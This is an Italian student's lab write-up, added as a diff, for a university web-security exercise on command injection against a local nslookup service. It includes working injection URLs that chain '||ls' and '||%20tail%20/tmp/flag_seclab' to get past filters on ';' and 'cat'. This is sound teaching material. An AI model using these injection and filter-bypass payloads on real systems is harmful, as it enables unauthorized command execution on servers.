@@ -1,0 +1,55 @@
+# Nome: Davide Chirichella
+# Matricola: 0001071414
+# Esercizio: web vulnerabilities
+
+# ==============================================================================
+
+1. Accedendo al sito, e seguendo le indicazioni sulla prima pagina, noto che:
+	
+    - Accedendo al path http://localhost:8000/?domain=www.ulisse.unibo.it  
+    noto che il sito esegue il comando nslookup al dominio www.ulisse.unibo.it
+    passato come parametro "domain"
+    
+2. Da ciò si evince che è possibile sfruttare una vulnerabilità nota: command injection
+Essa è una vulnerabilità di sicurezza in cui un'applicazione web accetta input dall'utente 
+e lo utilizza all'interno di un comando di sistema senza un'adeguata sanitizzazione o convalida. 
+Ciò consentirà ad un attaccante di eseguire comandi arbitrari sul server.
+
+3. Per provare a sfruttare questa vulnerabilità per ottenere il file /tmp/flag_seclab:
+
+	- Provo a concatenare alla variabile il ";" per eseguire un comando successivo
+	Il ; è filtrato
+	
+	- Notando che nslookup fallisce, posso mettere condizione "or" e un comando che verrà 
+	eseguito per la suddetta causa. Provo con ls e funziona
+	
+	http://localhost:8000/?domain= ||ls
+	
+	/bin/sh: 1: nslookup: not found
+	web_ce.py
+	web_ce1.py
+	web_ce2.py
+	web_ce3.py
+	web_ce4.py
+	web_ce5.py
+	web_challenge_sqli_union.txt
+	web_pt.py
+	web_pt1.py
+	web_sqli.py
+	web_sqli_union.py
+	web_xss
+	web_xss1
+
+	- Provo ad eseguire http://localhost:8000/?domain=||%20cat%20/tmp/flag_seclab
+	Il sito ha filtrato il comando cat
+	
+	- Uso l'alternativa a cat "tail" per ottenere le ultime 10 righe. 
+	L'input è filtrato
+	
+	- Uso un %20 per mettere uno spazio in formato ASCII
+	http://localhost:8000/?domain=||%20tail%20/tmp/flag_seclab%20
+	
+	stampato!
+
+
+# ==============================================================================
